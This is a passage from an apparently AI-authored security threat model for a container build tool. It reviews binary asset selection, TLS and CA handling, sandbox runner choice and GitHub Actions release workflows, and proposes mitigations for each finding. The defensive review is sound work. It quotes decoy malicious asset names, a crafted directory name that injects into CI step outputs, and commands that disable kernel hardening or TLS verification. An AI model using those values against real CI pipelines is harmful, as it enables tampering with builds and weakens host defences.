 downloadURL = asset.BrowserDownloadURL
```

Selection is an **unanchored `Contains`** against patterns like `melange_linux_amd64`,
filtered only by the suffix denylist above. Three concrete failure modes:

1. **Denylist bypass by suffix.** An asset named `grype_0.111.0_linux_amd64.sha256.txt`
 is *not* skipped — its suffix is `.txt`, not `.sha256` — and *does* match the pattern.
 It would be installed as the `grype` binary. Likewise `..._linux_amd64.tar.gz.sbom.json`
 (suffix `.json`) and `..._linux_amd64.att`. This is not hypothetical upstream
 behaviour; it is the generic failure mode of denylisting filename suffixes.
2. **Prefix/suffix smuggling.** `melange_linux_amd64_PATCHED`, `evil-melange_linux_amd64`,
 and `melange_linux_amd64-v2` all match. An attacker who can add (not replace) a single
 asset to a release wins, which is a strictly weaker requirement than replacing the real
 one.
3. **Order dependence.** The loop takes the *first* match in GitHub's asset ordering, so
 which binary is installed depends on an upstream-controlled list order. Non-determinism
 in a security decision is itself the defect — and it is not only a security defect:
 *order dependence on an upstream-controlled list* is a reproducibility violation by the
 charter's own constraint as well, which widens the set of reviewers who should care
 about fixing it.

**Phase 1 mitigation.** Replace the whole block with an **exact-name allowlist** derived
from the lock file: `toolchain.lock` names the exact asset filename per
`(tool, version, GOOS, GOARCH)`, and selection is `asset.Name == spec.AssetName`. No
`Contains`, no suffix denylist, no ordering dependence. Combined with TCH-1's digest check
this makes asset selection unambiguous. Unit-test with a synthetic release payload
containing all three decoy names above.

**Residual risk:** adding a new platform requires a lock entry. That is correct — an
unlocked platform should fail loudly rather than guess.

---

### TCH-3 — Unbounded archive expansion and missing transport limits

| | |
|---|---|
| **Class** | Decompression bomb / uncontrolled resource consumption (CWE-409, CWE-400) |
| **STRIDE** | Denial of service |
| **Severity** | **S2 Low** |
| **Exploitability** | **E2 Hard** (requires the same position as TCH-1) |
| **Owner** | Security Engineer |
| **Lenses** | Fail Securely, Defense in Depth |

`extractFromTarGz` (`toolchain.go:461`) iterates tar entries with no cap on entry count,
so a tar with millions of headers spins the CPU before any match is found. The
`io.LimitReader(tr, maxBinaryBytes)` cap is 500 MiB per extracted file — a gzip bomb can
therefore fill 500 MiB of disk legitimately. `http.DefaultClient` is used for both the API
call (`toolchain.go:340`) and the download (`toolchain.go:430`) with **no `Timeout`**, so a
slowloris server hangs `toolchain install` indefinitely.

**Credit where due — two things are already right here**, and should not be regressed:

- The extractor matches on `filepath.Base(hdr.Name)` and writes to a fixed `destPath`
 (`toolchain.go:478`). **Zip-Slip / tar path traversal is not possible.** This is the
 correct pattern and should be preserved verbatim through any refactor.
- `setGitHubAuth` (`toolchain.go:321`) is applied to the two `api.github.com` requests and
 **not** to the asset download (`toolchain.go:425`). `GITHUB_TOKEN` is therefore not sent
 to the release CDN or to any redirect target. Correct, and worth an explicit comment so
 it is not "helpfully" added later.

**Phase 1 mitigation.** Give the toolchain a dedicated `*http.Client` with
`Timeout: 5 * time.Minute`; cap tar entries at 10 000; reduce `maxBinaryBytes` to a
realistic 250 MiB; add the regression test for the traversal case so the existing good
behaviour is locked in.

**Residual risk:** negligible. DoS against a local CLI is self-inflicted.

---

## 6. Surface 3 — TLS and custom CA handling

**STRIDE: Spoofing, Tampering, Information disclosure.**

### 6.1 The headline fact

**`tlsutil.NewTLSConfig` has zero callers.** `grep -rn "NewTLSConfig" --include=*.go.`
returns the definition and its doc comment. Nothing else. The package doc claims it is
"Used by the toolchain manager, updater, and registry push operations"
(`tlsutil.go:64–66`). It is used by none of them.

Two independent consequences follow, and they point in opposite directions.

---

### TLS-1 — `tls.insecure` is parsed, documented, and unenforced

| | |
|---|---|
| **Class** | Security control present in the configuration surface but not wired to any enforcement point (CWE-1288); improper certificate validation (CWE-295) once it *is* wired |
| **STRIDE** | Spoofing, Tampering |
| **Severity** | **S3 Medium** today → **S5 Critical** the moment it is wired up |
| **Exploitability** | **E5 Trivial** to set; **E4** to abuse once enforced |
| **Owner** | Security Engineer |
| **Lenses** | Secure Defaults, Fail Securely, Open Design |

**Today.** `types.TLSConfig.Insecure` (`types.go:56`) is accepted by the parser and
documented as "disables TLS verification entirely". The only code that reads it is
`NewTLSConfig` (`tlsutil.go:68`), which nothing calls. A user who sets
`tls: { insecure: true }` gets **no behaviour change at all** — their builds still verify
certificates. That is accidentally safe and genuinely dangerous: the config lies to the
operator in the safe direction now, and will lie in the unsafe direction the day someone
wires the function up thinking they are fixing a bug.

**Tomorrow.** When `NewTLSConfig` is connected to the toolchain downloader — the obvious
"fix" for the custom-CA gap in TLS-2 — `InsecureSkipVerify: true` becomes reachable from a
single line of attacker-supplied YAML, and it chains directly with TCH-1: no certificate
validation plus no binary verification equals arbitrary code execution for anyone on the
network path. The `//nolint:gosec` at `tlsutil.go:69` means the linter will not object.

**Phase 1 mitigation.**

1. **Remove `Insecure` from `nimpack.yaml` entirely** — a schema removal, and therefore
 breaking by definition, but the cheapest breaking change in this document: `NewTLSConfig`
 has zero callers today, so no build's behaviour changes and no image digest changes when
 it goes; the only thing that breaks is a config that *mentions* the key. Approved
 pre-1.0 under §4.1's ruling — same declaration as CFG-1, and ADR-0002 covers CFG-1,
 TLS-1, and TLS-2 together since all three touch `types.TLSConfig`. If the debugging
 capability is genuinely needed, move it to `NIMBOPACKS_TLS_INSECURE=1` — the named
 principle in §2.1: an environment variable is a deliberate act by the person at the
 keyboard and does not travel with the repo.
2. When it is set, print a red banner on **every** affected request and refuse to combine
 it with `--push` or with `toolchain install`. Downloading an executable over an
 unverified channel is never a debugging need.
3. **Required: sequence this against CFG-4's `Decoder.KnownFields(true)`, in this exact
 order, because doing steps 3 and 4 in one PR produces the worst available user
 experience.**
 1. Keep `Insecure` in the struct.
 2. `config.Validate` hard-fails on `insecure: true` with an explicit message — "this
 field is not implemented and must not be relied upon." (Not on `insecure: false`;
 that is a no-op the user can simply delete.)
 3. CFG-4's `Decoder.KnownFields(true)` lands.
 4. Remove the field one minor release later, by which point the explicit error has
 been doing the teaching. Landing `KnownFields(true)` before the explicit hard-fail
 replaces a specific, actionable error with a generic unknown-key error for anyone who
 copy-pasted `tls: { insecure: false }` from current docs.
4. **Wire `NewTLSConfig`, after `Insecure` is removed** — not an either/or with deletion;
 TLS-2(b) explicitly needs it for the toolchain client, so "delete or wire" is resolved
 elsewhere in this document and should not be left reading as an open choice. Dead
 security code is worse than absent security code — it reads as a control during review.

**Residual risk:** an operator can still set the env var. That is the intended, visible,
non-propagating escape hatch.

---

### TLS-2 — Custom CAs do not reach the toolchain downloader, and the sandbox trust store is replaced rather than extended

| | |
|---|---|
| **Class** | Incomplete propagation of a trust-anchor configuration, creating a usability cliff that pushes users toward disabling verification |
| **STRIDE** | Spoofing (via the workaround users adopt), Denial of service |
| **Severity** | **S3 Medium** |
| **Exploitability** | **E4 Easy** — this is the default experience behind any corporate proxy |
| **Owner** | Security Engineer |
| **Lenses** | Secure Defaults ("the insecure path must not be the easy path"), Economy of Mechanism |

Two halves of the same problem:

**(a) Toolchain downloads ignore `tls.ca_cert_paths`.** `internal/toolchain` uses
`http.DefaultClient` (`toolchain.go:340`, `:379`, `:430`), which knows nothing about
`TLSConfig`. A user behind a TLS-terminating corporate proxy configures
`ca_cert_paths`, watches their melange build succeed, and watches
`nimbopacks toolchain install` fail with an opaque x509 error. The documented remedy —
`tls.insecure` — does nothing (TLS-1), so the user's actual remedies are
`GODEBUG=x509ignoreCN`, hand-installing the CA system-wide, or giving up. One of those is
a security decision made in frustration.

**(b) The build sandbox's trust store is replaced, not extended.**
`MelangeEnvVars` (`tlsutil.go:98`) sets `SSL_CERT_FILE`, `CURL_CA_BUNDLE`,
`REQUESTS_CA_BUNDLE`, `GIT_SSL_CAINFO`, and `NODE_EXTRA_CA_CERTS` to a bundle containing
**only** the user's custom CAs. For OpenSSL, curl, and git, those variables *override* the
default CA file rather than adding to it. So the moment a user adds a corporate CA, every
public TLS endpoint their build touches — `proxy.golang.org`, `registry.npmjs.org`,
`repo.maven.apache.org`, PyPI — stops verifying successfully. (`NODE_EXTRA_CA_CERTS` is
the one that genuinely appends; the inconsistency makes the failure harder to diagnose.)

The predictable user response is to disable verification in their own build command, e.g.
`npm config set strict-ssl false` or `pip --trusted-host`, inside the `build.command` that
then ships into the image.

**This is the exact pattern the charter says to treat as a bug rather than a tradeoff:
the secure path is harder than the insecure one.**

**Required: the diagnosis is correct, but mitigation 1's original form would deepen an
existing architecture violation, so its address changes, not its content.**
`internal/utils/tlsutil.go` is already a Wolfi adapter living in the core, confirmed by:

- `ImageCACertInstallStep` (`tlsutil.go:113`) returns a `types.MelangePipelineStep` whose
 body is a shell script containing the literal melange template token
 `${{targets.destdir}}`.
- It hardcodes Alpine/Wolfi trust-store paths: `/usr/local/share/ca-certificates/` and
 `/etc/ssl/certs/`.
- A function is literally named `MelangeEnvVars` (`tlsutil.go:98`).
- Its only three consumers in the tree are `pkg/backend/wolfi/wolfi.go:95`, `:109`, `:116`.
 Nothing else calls it.

By the hexagonal lens — domain code (`internal/utils`) must not know which adapter is
loaded — a package that emits melange pipeline syntax and apk trust-store paths knows
exactly which adapter is loaded. Putting the proposed `update-ca-certificates` step (the
distribution-blessed mechanism *specifically for Alpine/Wolfi*) where the current
step-emitter lives would drive the leak deeper and make the eventual extraction more
expensive. This is recorded as a known gap in **ADR-0001** (backend-abstraction baseline,
Principal Architect).

**Phase 1 mitigation.**

1. **First, as a prerequisite — split `tlsutil` along the port/adapter line.** This is a
 near-free mechanical move today (its only callers are already in `wolfi.go`) and stops
 being free the moment a fix lands on top of the current shape, so it is sequenced ahead
 of item 2 and of CFG-1's mitigations 2 and 4 in §11's P0 ordering.
 - **Stays in `internal/utils/tlsutil.go` (backend-agnostic):** reading, resolving and
 containment-checking CA paths; PEM parsing/validation (CFG-1 mitigation 2); producing
 a verified `[]byte` bundle plus the subject/fingerprint list for logging (CFG-1
 mitigation 4); building nimbopacks' own `*http.Client` for its own egress.
 - **Moves to `pkg/backend/wolfi/` (adapter):** `MelangeEnvVars`,
 `ImageCACertInstallStep`, and every `${{ }}` token and `/etc/ssl/certs` path —
 including the `update-ca-certificates` step below. The port is "give me a verified CA
 bundle and its fingerprints"; how a bundle becomes trust inside a build sandbox is the
 backend's business.
2. Build the sandbox bundle as **system roots + custom CAs**, not custom CAs alone: copy
 the custom CAs into `/usr/local/share/ca-certificates/` and run
 `update-ca-certificates` in a pipeline step (emitted from `pkg/backend/wolfi/` per item
 1) instead of overriding `SSL_CERT_FILE`. Note for the implementer: this changes the
 melange pipeline for every user with custom CAs, so it changes their image digest — a
 reproducibility-visible change that belongs in release notes alongside CFG-1's default
 flip.
3. Give `internal/toolchain` a `*http.Client` built from `NewTLSConfig(srcDir, cfg.TLS)`
 so custom CAs apply to downloads — **after** TLS-1 removes `Insecure` from the config,
 not before. Ordering matters: wiring this up first is what turns TLS-1 from medium into
 critical.

**Residual risk:** trusting an additional CA is inherently a trust expansion. Logging the
injected subjects/fingerprints (CFG-1 mitigation 4) makes it auditable.

---

### TLS-3 — CA bundle written world-readable into the user's working tree

| | |
|---|---|
| **Class** | Insecure temporary file creation in a shared directory (CWE-377) with incorrect permissions (CWE-732) |
| **STRIDE** | Information disclosure |
| **Severity** | **S3 Medium** |
| **Exploitability** | **E3 Moderate** |
| **Owner** | Security Engineer |
| **Lenses** | Least Privilege, Secrets management (never in source) |

**Evidence.** `wolfi.go:100–105`:

```go
const bundleName = ".nimbopacks-ca-bundle.pem"
hostBundle:= filepath.Join(opts.SourceDir, bundleName)
if err:= os.WriteFile(hostBundle, pemData, 0o644); err != nil {... }
defer os.Remove(hostBundle)
```

Three problems, in order of severity:

1. **It is written into the user's git working tree**, not a temp dir. `.gitignore`
 contains no entry for `.nimbopacks-ca-bundle.pem` — verified. A concurrent
 `git add -A` during a build, or a build killed by `SIGINT`/`SIGKILL`/`os.Exit` (where
 `defer` does not run), leaves the file in the tree where the next commit picks it up.
 Chained with CFG-1, the "CA bundle" may be an SSH key, and the destination may be a
 public repository.
2. **Mode `0644`.** Every local user can read it for the duration of the build. The same
 file's sibling, `writeEnvFile` at `wolfi.go:336`, correctly uses `0600`. The
 inconsistency within one function is the tell that `0644` was not a decision.
3. The cleanup is best-effort and unordered with respect to signal handling.

**This is also a reproducibility defect, which makes the choice of destination
non-optional.** A build killed by `SIGKILL` orphans the file in the source tree; the
*next* build's `build.command` (`go build./...`, `npm pack`, a `COPY.`-shaped step) may
then see a file the previous build left behind, so the same source plus the same
`nimpack.yaml` no longer produces the same image digest — a direct violation of the
charter's reproducibility constraint, the same TB-6 pattern noted in §2.

**Phase 1 mitigation, required to target the per-build work dir specifically, not
`cache.CacheDir`'s shared root.** Write the bundle into the directory returned by
`cache.NewBuildWorkDir` with mode `0600` — **not** `SourceDir`, and not the shared
`CacheDir` root either. Relocating it to `CacheDir`'s root would trade a loud failure
mode (a stray file visible in `git status`) for a quiet one (an orphaned file persisting
indefinitely in TB-6's shared, cross-project cache). `NewBuildWorkDir` already allocates
a fresh timestamped directory per build, which is the correct scope. Confirm
`nimbopacks cache clean` removes it. melange already receives `--source-dir` separately,
so the bundle can be mounted or referenced from the work dir. If it must land in the
source tree for the sandbox to see it, use `0600` **and** add
`.nimbopacks-ca-bundle.pem` to `.gitignore` **and** register a signal handler that removes
it. Regression test: assert the file mode is `0600` and that the path is under the
per-build work dir, never under `SourceDir` or directly under `CacheDir`.

**Residual risk:** a hard `SIGKILL` can still orphan the file inside its per-build
directory. `nimbopacks cache clean` is the backstop there; the `.gitignore` entry remains
the backstop for the commit path if the source-tree fallback is ever used.

---

## 7. Surface 4 — Container runner privileges

**STRIDE: Elevation of privilege, Tampering.**

### RUN-1 — Silent downgrade from the bubblewrap sandbox to the Docker runner

| | |
|---|---|
| **Class** | Silent security-control downgrade — automatic substitution of an unprivileged sandbox with a root-equivalent one, with no operator consent (CWE-636: not failing securely) |
| **STRIDE** | Elevation of privilege |
| **Severity** | **S4 High** |
| **Exploitability** | **E4 Easy** — bubblewrap is absent by default on WSL2, macOS, and most rootless container environments |
| **Owner** | Principal Architect (backend behaviour), Security Engineer (sign-off) |
| **Lenses** | Fail Securely, Least Privilege, Secure Defaults |

**Evidence.** `detectMelangeRunner` (`wolfi.go:294`):

```go
if _, err:= exec.LookPath("bwrap"); err == nil { return "" } // bubblewrap
if _, err:= exec.LookPath("docker"); err == nil { return "docker" }
return ""
```

and `wolfi.go:89–92` appends `--runner docker` and prints
`→ Runner: docker (bubblewrap not available)`.

The two runners are not interchangeable security boundaries:

| | bubblewrap | docker |
|---|---|---|
| Privilege required | Unprivileged user namespace | Docker daemon, running as **root** on the host |
| Boundary | seccomp + userns, no host daemon | A root daemon the client can instruct |
| Failure mode of a sandbox escape | Escapes to the invoking user | Escapes to root |

The code picks the second one automatically, based on nothing but which binary happens to
be installed, and announces it as an informational line among dozens of build-log lines.
The thing being executed inside that boundary is `build.command` from `nimpack.yaml` —
i.e. §4.0's "this config is a shell script". **The isolation strength of the only barrier
between untrusted config and the host is chosen by `exec.LookPath`.**

**Honest limitation.** I have **not** demonstrated a host escape. Docker is not installed
in this environment, so melange's docker runner could not be exercised, and the precise
container configuration melange requests (privileged? socket mounted? user namespace
remapping?) is determined inside melange, not here, and I have not audited melange's
source. I am therefore **not** claiming "docker runner equals container escape".

**What I am claiming, and what I can demonstrate from this repository alone**, is the
control-downgrade defect: a security boundary is swapped for a materially different one
automatically, silently, and without the operator being asked. That is a finding on its
own terms regardless of how melange configures the container, and it is the part this
project owns and can fix. The incremental question — how much privilege the docker runner
actually grants — is a follow-up that needs Docker.

**Phase 1 mitigation.**

1. **Do not auto-select the docker runner.** When `bwrap` is absent, fail with an
 actionable error: *"bubblewrap not found. Install it (`apt install bubblewrap`), or
 re-run with `--runner docker` to build inside a Docker container managed by the host's
 root daemon — this is a weaker isolation boundary and your `build.command` will run
 with the daemon's privileges."*
2. Add `--runner` to the CLI and `build.runner` to nothing — keep it a **flag only**, not
 a `nimpack.yaml` field. A repository must not be able to choose its own sandbox
 strength; that is the operator's call, and making it a config field would re-create
 CFG-1's shape. This is the fourth instance of §2.1's named principle.
3. **Required addition: `--runner` is a Wolfi concept and must not harden into a
 backend-agnostic CLI contract.** bubblewrap and docker are *melange* runners. The CLI
 surface is a public contract, so a bare `--runner` flag silently promotes a Wolfi
 implementation detail into it — a second backend would either have to pretend to
 understand `--runner`, or the core would have to `switch` on backend name to decide
 whether the flag is legal, which is the "no switch on language/backend in the core"
 invariant breaking by another name. Pre-1.0 and with one backend, this does not need
 `--backend-opt runner=docker` ceremony; it needs one cheap constraint: **the set of
 valid `--runner` values is supplied by the selected backend, not hardcoded in `cmd/`.**
 `cmd/` passes the string through; the backend validates it and errors on an unknown
 value. ADR-0001 (Principal Architect) records `--runner` as a known Wolfi leak in the
 CLI surface.
4. Print the selected runner in the build summary unconditionally. **Gate the SBOM
 build-metadata half on a verified no-digest-change test before adding it** — if the
 runner name reaches anything that affects the image digest, the same source plus the
 same `nimpack.yaml` produces different output on a bwrap machine versus a docker
 machine, which breaks the reproducibility constraint directly. Worth confirming before
 shipping rather than discovering after someone's reproducibility check fails.
5. Regression test: with a stubbed `exec.LookPath` reporting no `bwrap` and a present
 `docker`, `BuildPackage` must return an error and must not append `--runner docker`.

**Residual risk:** an operator who passes `--runner docker` accepts the weaker boundary
knowingly. Documented in `docs/security/`, and re-evaluated once melange's docker-runner
configuration can be audited with Docker available.

**Sequencing note:** CFG-3's own severity line reads "S4 if the runner is docker" — RUN-1
is a severity multiplier for CFG-3. Both are P1; land RUN-1 first so CFG-3 is scored
against the runner state that is actually in effect, not split across tranches in the
wrong order (§11).

---

### RUN-2 — CI disables kernel unprivileged-userns hardening to make the sandbox work

| | |
|---|---|
| **Class** | Host hardening control disabled to accommodate a build sandbox |
| **STRIDE** | Elevation of privilege |
| **Severity** | **S2 Low** on GitHub-hosted runners / **S5 Critical** if ever copied to a self-hosted runner |
| **Exploitability** | **E5 Trivial** to reach the code path (any PR touching the matched paths) |
| **Owner** | Security Engineer |
| **Lenses** | Defense in Depth, Minimize Attack Surface |

`.github/workflows/samples.yml:66–70`:

```yaml
- name: Enable rootless melange (bubblewrap)
 run: |
 sudo apt-get update
 sudo apt-get install -y bubblewrap
 sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
```

The job then builds every affected sample, executing `build.command` from
`samples/**/nimpack.yaml` — files a fork PR can modify. The workflow trigger is
`pull_request` (not `pull_request_target`), so a fork PR gets a read-only `GITHUB_TOKEN`
and no secrets, and the runner is an ephemeral single-use VM. That containment is what
holds the severity to low **today**, and it is contingent on facts that are not written
down anywhere.

The durable risk is propagation: this is the snippet an enterprise adopter will copy into
their own pipeline, where the runner is long-lived, self-hosted, and shares a host with
other jobs. There it is a direct path from a PR to the kernel's unprivileged-userns attack
surface on a persistent machine.

**Phase 1 mitigation.** Keep the sysctl — it is necessary and acceptable on an ephemeral
GitHub-hosted runner — but make the reasoning explicit and non-copyable:

1. Add a comment block above it stating that it is safe **only** because the runner is
 ephemeral, single-tenant, and the trigger is `pull_request` with a read-only token, and
 that it **must not** be used on a self-hosted runner.
2. Add `if: runner.environment == 'github-hosted'` so the step cannot silently run on a
 self-hosted runner that someone later adds to the pool.
3. Document the self-hosted guidance in `docs/security/` before the first enterprise
 adopter asks.

**Residual risk:** accepted and recorded. Revisit if self-hosted runners are ever
introduced — that change requires security sign-off.

---

### RUN-3 — The published release image ships a shell

| | |
|---|---|
| **Class** | Deviation from the project's own minimal-runtime baseline (NIST SP 800-190 §4.5) |
| **STRIDE** | Elevation of privilege (post-compromise), Tampering |
| **Severity** | **S2 Low** |
| **Exploitability** | **E1 Theoretical** (requires prior code execution in the container) |
| **Owner** | CTO (product decision), Security Engineer (advice) |
| **Lenses** | Container hardening, Minimize Attack Surface |

`apko.yaml` ships `bash~5.3-r12` alongside `melange`, `apko`, and `grype`. The image
otherwise meets the baseline well: `run-as: 65532`, a `nonroot` user and group, explicit
entrypoint, `layering: {strategy: origin, budget: 10}`, no package manager.

The shell is **defensible** — `nimbopacks` executes melange, which executes build pipeline
`runs:` scripts, which need `/bin/sh`. This is a build tool, not an application runtime.
But it should be a recorded decision rather than an unexamined dependency, because
"minimal, no shell" is a claim the project makes about the images it *produces* and a
reader will reasonably apply it to the image it *ships*.

**Phase 1 mitigation.** Record it as a short ADR (Principal Architect has taken this one —
it is an architecture decision with a rejected alternative, a shell-free tool image, which
is exactly the ADR shape) stating that the Nimbopacks tool image intentionally contains
`bash` because melange pipelines require a shell, that this does not apply to images
Nimbopacks builds, and that application images produced by the packs must remain
shell-free by default with a `-dev` variant as the opt-in.

**Residual risk:** accepted. Re-examine if a shell-free melange execution mode appears.

---

## 8. Surface 5 — GitHub Actions supply chain

**STRIDE: Tampering, Elevation of privilege, Spoofing, Repudiation.**

**What is already correct**, and must not regress: `permissions: contents: read` as the
default in every workflow; per-job elevation only where needed; `concurrency` groups;
`persist-credentials: false` in `scorecard.yml`; `BASE_REF` passed through `env:` rather
than interpolated into the shell in `commit-lint.yml` (the textbook expression-injection
defence, done right); Dependabot covering both `github-actions` and `gomod`; **no
`pull_request_target` anywhere**; and most third-party actions already SHA-pinned.

---

### CI-1 — Unpinned Wolfi package resolution inside the privileged signing step

| | |
|---|---|
| **Class** | Unpinned dependency resolution inside a step holding release-signing authority (TOCTOU on an upstream package channel) |
| **STRIDE** | Tampering, Spoofing |
| **Severity** | **S5 Critical** — it reaches a published, cosign-signed, Rekor-logged release |
| **Exploitability** | **E2 Hard** — requires compromising a Wolfi package |
| **Owner** | Security Engineer (with CTO for the SLSA roadmap) |
| **Lenses** | Supply chain (pin dependencies with committed lockfiles), Least Privilege |

`.github/workflows/release.yml:84–117`. The `oci-image` job holds `packages: write` and
`id-token: write` — i.e. the authority to push to GHCR *and* to obtain the OIDC token that
cosign uses for keyless signing. Inside it:

```yaml
- uses: wolfi-dev/wolfi-act@d78f3659c50c4520e222df428f4903a1c4b0c6ee # main
 with:
 packages: apko,cosign,crane
```

The *action* is SHA-pinned. The **packages it installs are not**: `apko,cosign,crane`
resolve to whatever Wolfi publishes at the moment the release runs. A compromised Wolfi
`cosign` or `apko` package executing at that moment has, in a single step: the GHCR push
token, the OIDC identity, and the content of the image about to be signed. It could
publish an arbitrary image under `ghcr.io/nimbostack/nimbopacks`, sign it with the
project's genuine identity, and have Rekor attest to it. Every downstream
`cosign verify` would pass.

This is the **highest-blast-radius finding in the model**: it is the one place where a
compromise produces a correctly-signed malicious release. Exploitability is low — Wolfi is
well defended — but the charter's target is SLSA Build L3, and L3 does not permit an
unpinned dependency inside the build-and-sign step.

**Secondary issues in the same workflow:**

- `goreleaser-action` with `version: latest` (`release.yml:34`) — the action is pinned, the
 GoReleaser binary it downloads is not.
- `chainguard-dev/actions/setup-melange@de68b87… # main` and `wolfi-act@d78f365… # main`
 are SHA-pinned to commits on a **moving branch**, so Dependabot bumps track `main`
 rather than tagged releases. The pin is sound; the review cadence is the gap.

**Phase 1 mitigation.**

1. Pin the Wolfi packages by exact version:
 `packages: apko=1.2.2-r1,cosign=<ver>,crane=<ver>` — the same discipline `apko.yaml`
 already applies with `melange~0.48.2-r1`. The project pins its own runtime packages but
 not its signing-step packages; close the inconsistency.
2. Pin `goreleaser-action`'s `version:` to an exact GoReleaser release.
3. Split the step: build/push with the GHCR token, then sign in a **separate step** that
 holds `id-token: write` but not the push token. Least Privilege — no single step should
 hold both "can publish" and "can sign".
4. Add a release-verification job that `cosign verify`s the published digest and checks
 the Rekor entry before the release is marked complete.

**Residual risk:** pinned versions must be bumped, and a bump is a trust decision. Route
`release.yml` and `apko.yaml` through CODEOWNERS (CI-4) so every bump gets security
sign-off.

---

### CI-2 — Release tags are not protected, so the signing workflow is not gated by merge authority

| | |
|---|---|
| **Class** | Missing authorisation gate on a privileged trigger (CWE-862) |
| **STRIDE** | Elevation of privilege, Spoofing, Repudiation |
| **Severity** | **S5 Critical** |
| **Exploitability** | **E3 Moderate** — requires repository write access, or a compromised workflow holding `contents: write` |
| **Owner** | CTO → Board (@NeoMotsumi); branch and tag protection are Board-only |
| **Lenses** | Least Privilege, CI/CD supply chain, Complete Mediation |

`release.yml:3–6` triggers on `push: tags: ['v*.*.*']`. Branch protection on `main` does
**not** protect tags — they are a separate GitHub ruleset. The governance model says "Merge
to `main`, create release tags: **Board only**", but today that is policy text, not an
enforced control.

Consequences: anyone with write access can push `v9.9.9` and trigger a signed GHCR release
from **arbitrary tree content**, bypassing every review gate on `main`. The `goreleaser`
job holds `contents: write`; a compromise there could create the tag that triggers the
`oci-image` job. And because the tag is the only record of what was released, a
force-pushed tag breaks attribution — the Repudiation leg of STRIDE.

**Phase 1 mitigation.**

1. **Tag protection ruleset on `v*`** — restrict tag creation and deletion to the Board,
 and block tag updates. Board action; I cannot set this and must not pretend otherwise.
2. Add a guard step at the top of `release.yml` that fails unless the tag's commit is an
 ancestor of `origin/main`. That is enforceable from this repository and catches
 releases cut from unreviewed trees.
3. Branch protection on `main`: required CODEOWNERS review, required status checks
 (CI + CodeQL + Scorecard), signed commits, linear history, no force pushes. Board
 action.

**Residual risk:** the Board's own account remains the trust root. Enforce 2FA/hardware
keys and require signed tags.

---

### CI-3 — `GITHUB_OUTPUT` / matrix injection via an attacker-controlled path component

| | |
|---|---|
| **Class** | Output injection into `$GITHUB_OUTPUT` from unsanitised filesystem input, feeding `fromJSON` (CWE-74 variant specific to Actions) |
| **STRIDE** | Tampering |
| **Severity** | **S3 Medium** |
| **Exploitability** | **E4 Easy** — one directory added in a fork PR |
| **Owner** | Security Engineer |
| **Lenses** | Input handling (validate on format, reject ambiguous input), Agentic/tool-use (never let controlled strings reach an interpreter unsanitised) |

**Attack path.** `samples.yml:42–48` runs `./samples/affected-samples.sh` on the PR head
and writes its output with `echo "matrix=$matrix" >> "$GITHUB_OUTPUT"`. The script
(`samples/affected-samples.sh:31–35`) discovers sample names from disk:

```bash
mapfile -t ALL_SAMPLES < <(find "$repo_root/samples" -mindepth 3 -maxdepth 3 -name nimpack.yaml | sed...)
```

and serialises them with `to_json_array` (`:49`), whose own comment states the assumption
that makes it a vulnerability:

```bash
# to_json_array <item...> — no jq dependency; sample names are always
# plain "lang/name" tokens, so no escaping is needed.
```

The names come from a PR-controlled directory tree, so the assumption does not hold. A PR
that adds `samples/go/foo"},{"x":"y/nimpack.yaml` breaks out of the JSON string. A PR that
adds a directory containing a **newline** — which git permits — injects a second line into
`$GITHUB_OUTPUT`, letting the attacker define arbitrary step outputs for the `changes`
job, which the `verify` job consumes via `fromJSON(needs.changes.outputs.matrix)`.

**Containment that limits this to medium:** the trigger is `pull_request`, so a fork PR
has a read-only token and no secrets, and the job already runs attacker-supplied build
commands by design. The injection does not currently cross a privilege boundary. It is
worth fixing anyway because (a) the same pattern is one `pull_request_target` away from
critical, (b) it can corrupt CI results and mask a failing sample, and (c) the fix is five
lines.

**Not demonstrated:** no PR was opened against the public repository to prove it — doing so
would be an unauthorised test against a live project. The path from `find` output to
`$GITHUB_OUTPUT` is traced line by line above and relies only on documented git and
Actions behaviour.

**Phase 1 mitigation.**

1. In `affected-samples.sh`, validate every discovered name against
 `^[a-z0-9][a-z0-9._-]*/[a-z0-9][a-z0-9._-]*$` and `exit 1` on any that fails, naming the
 offending path. A sample directory that is not a plain token is a bug in every case.
2. Replace `echo "matrix=$matrix" >> "$GITHUB_OUTPUT"` with the heredoc-delimited form:
 ```bash
 { echo "matrix<<__EOF__"; printf '%s\n' "$matrix"; echo "__EOF__"; } >> "$GITHUB_OUTPUT"
 ```
3. Regression test: a shell test that feeds the script a crafted directory name and
 asserts a non-zero exit.

**Residual risk:** none for this class once names are charset-validated.

---

### CI-4 — No `CODEOWNERS`, so the security sign-off rule has no enforcement mechanism

| | |
|---|---|
| **Class** | Governance control defined in policy but not enforced by configuration |
| **STRIDE** | Tampering, Repudiation |
| **Severity** | **S3 Medium** |
| **Exploitability** | **E5 Trivial** |
| **Owner** | Security Engineer (author the file), Board (enable required review) |
| **Lenses** | Secure SDLC, Complete Mediation |

`.github/CODEOWNERS` does not exist — verified. The charter requires security sign-off on
any PR touching `internal/toolchain`, `internal/utils/tlsutil`, `pkg/backend`, or
`.github/workflows`, and OpenSSF Scorecard's Branch-Protection check expects it. Today
that rule depends entirely on a reviewer remembering it.

**Phase 1 mitigation.** Add `.github/CODEOWNERS`:

```
* @NeoMotsumi
/internal/toolchain/ @NeoMotsumi
/internal/utils/ @NeoMotsumi
/pkg/backend/ @NeoMotsumi
/.github/workflows/ @NeoMotsumi
/docs/security/ @NeoMotsumi
/apko.yaml @NeoMotsumi
/melange.yaml @NeoMotsumi
/.grype.yaml @NeoMotsumi
```

Agent reviewers have no GitHub identities, so the Board is the only reviewer GitHub can
enforce against today; the agent-side sign-off continues to run through Paperclip. Enabling
"Require review from Code Owners" is a Board action.

**Residual risk:** CODEOWNERS without required-review branch protection is advisory. Both
halves are needed; the file is the half this repository can ship.

---

### CI-5 — Checkout credentials persist into steps that execute repository-controlled code

| | |
|---|---|
| **Class** | Credential persistence in the workspace (CWE-522) |
| **STRIDE** | Information disclosure |
| **Severity** | **S2 Low** currently |
| **Exploitability** | **E4 Easy** |
| **Owner** | Security Engineer |
| **Lenses** | Secrets management, Least Privilege, Defense in Depth |

`actions/checkout` defaults to `persist-credentials: true`, writing an
`http.extraheader` auth token into `.git/config` on the runner. Only `scorecard.yml:28`
disables it. In `samples.yml` the job then runs `verify-builds.sh`, which drives melange
builds whose `build.command` comes from `samples/**/nimpack.yaml` — repository-controlled
code reading a credential from the filesystem.

Impact is currently low because fork-PR tokens are read-only and the workflow default is
`contents: read`. It is a defence-in-depth gap, and the fix is one line per checkout.

**Phase 1 mitigation.** Add `persist-credentials: false` to every `actions/checkout` step
